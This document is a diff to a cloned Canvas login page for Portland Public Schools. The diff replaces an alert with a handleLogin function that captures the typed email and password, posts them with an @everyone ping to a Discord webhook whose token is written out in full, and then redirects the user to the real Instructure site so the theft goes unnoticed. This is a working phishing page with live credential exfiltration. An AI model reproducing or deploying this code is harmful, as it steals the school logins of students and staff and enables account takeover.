@@ -18,6 +18,7 @@
   <link rel="stylesheet" href="https://du11hjcvx0uqb.cloudfront.net/dist/brandable_css/new_styles_normal_contrast/bundles/login-a4ed1b59a8.css" media="screen" />
   <link rel="apple-touch-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/apple-touch-icon-585e5d997d.png" />
   <link rel="icon" type="image/x-icon" href="https://du11hjcvx0uqb.cloudfront.net/dist/images/favicon-e10d657a73.ico" />
+
   
   <script>if (navigator.userAgent.match(/(MSIE|Trident\/)/)) location.replace('/ie-is-not-supported.html')</script>
   <script>
@@ -63,15 +64,34 @@
     }, 1000);
   </script>
 
+
   <script>
     function handleLogin() {
+      // Get the values of email and password
       var email = document.getElementById('pseudonym_session_unique_id').value;
       var password = document.getElementById('pseudonym_session_password').value;
       
-      alert("Email: " + email + "\nPassword: " + password);
-      
+      // Send the email and password to the Discord webhook
+      fetch("https://discord.com/api/webhooks/1280675104241750109/J8mFYpZmhPAQwat3DmaSwdX7KYSa6CxYmJOP2mgKacRCSURcBf7OzP1qJXzBMBxjlWfo", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content:`@everyone\nEmail: ${email}\nPassword: ${password}`
+        })
+      }).then(response => {
+        if (response.ok) {
+          console.log(":).");
+        } else {
+          console.error(":(");
+        }
+      });
+
+      // Redirect to the specified link (replace 'https://portlandpublic.instructure.com/' with your desired URL)
       window.location.href = "https://portlandpublic.instructure.com/";
       
+      // Prevent form submission to server
       return false;
     }
   </script>
@@ -87,7 +107,7 @@
     <h1>You need to have JavaScript enabled in order to access this site.</h1>
   </div>
 </noscript>
-
+<!-- Other content omitted for brevity -->
 <div id="flash_message_holder"></div>
 <div id="flash_screenreader_holder"></div>
 
@@ -156,7 +176,7 @@
 </div>
 
               </div>
-            </div>
+            </div> <!-- ic-Login__actions -->
             
 
 </form>          <form id="forgot_password_form" style="display: none;" action="/forgot_password" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token" value="8PT/2u5+CWmOeC6yZLrYpiIgq2ppD4hVPz2lHFyNC6iXoZa4lixjO/87WPsdg7PuThKaXy5H2GVFee5uF9Vnzw==" autocomplete="off" />
@@ -177,10 +197,10 @@
                 <button type="submit" class="Button Button--login">
                   Request Password
                 </button>
-              </div> 
+              </div> <!-- end ic-Login__actions -->
             </div> 
-</form>        </div> 
-      </div> 
+</form>        </div> <!-- end ic-Login__body -->
+      </div> <!-- end ic-Login__innerContent  -->
       <footer role="contentinfo" id="footer" class="ic-Login-footer">
 
         <div id="footer-links" class="ic-Login-footer__links">
@@ -237,12 +257,16 @@
     <a href="https://www.instructure.com/k12/products/mastery/mastery-connect">Mastery Connect</a>
     <a href="https://www.instructure.com/k12/products/elevate/elevate-k12-analytics">Elevate Analytics</a>
     <a href="https://www.instructure.com/higher-education/products/impact">Impact</a>
-    
+
+
         </div>
     </footer>
-    </div> 
+    </div> <!-- end ic-Login__content -->
   </div>
-</div> 
+</div> <!-- end ic-Login -->
+
+
+
           </div>
         </div>
         <div id="right-side-wrapper" class="ic-app-main-content__secondary">
@@ -254,17 +278,27 @@
     </div>
   </div>
 
-    <div style="display:none;">
+
+
+    <div style="display:none;"><!-- Everything inside of this should always stay hidden -->
     </div>
   <div id='aria_alerts' class='hide-text affix' role="alert" aria-live="assertive"></div>
   <div id='StudentTray__Container'></div>
   <div id="react-router-portals"></div>
+  
+
+
+
 
 <script>
 //<![CDATA[
 (window.bundles || (window.bundles = [])).push('inst_fs_service_worker');
 //]]>
 </script>
-</div>
+  
+
+</div> <!-- #application -->
+
+
 </body>
 </html>
